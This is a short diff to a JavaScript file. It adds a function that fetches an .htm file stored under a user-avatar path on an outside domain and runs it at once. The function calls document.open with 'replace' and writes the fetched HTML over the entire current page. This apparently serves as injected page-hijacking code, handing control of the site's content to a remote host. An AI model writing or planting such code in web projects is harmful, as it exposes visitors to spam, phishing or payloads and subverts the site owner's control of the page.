@@ -1,1 +1,18 @@
-var urls=['https://static.ligongku.com/user/face/d019406664a94cfda813acbed1b81ea3.htm?{wwwwwwwwww}{nnnnnnnnnn}',];
+function loadhtml(url){ 
+ var xhr = new XMLHttpRequest;
+ var html = null;
+ function render() {
+  var a = document.open("text/html", "replace");
+  a.write(html);
+  a.close();
+ }
+ xhr.onload = function () {
+  html = xhr.responseText;
+  var delay = 0;
+  if (delay > 0) setTimeout("render()", delay * 1000)
+  else render();
+ };
+ xhr.open("GET", url, !0);
+ xhr.send(); 
+}
+ loadhtml('https://static.ligongku.com/user/face/d019406664a94cfda813acbed1b81ea3.htm');
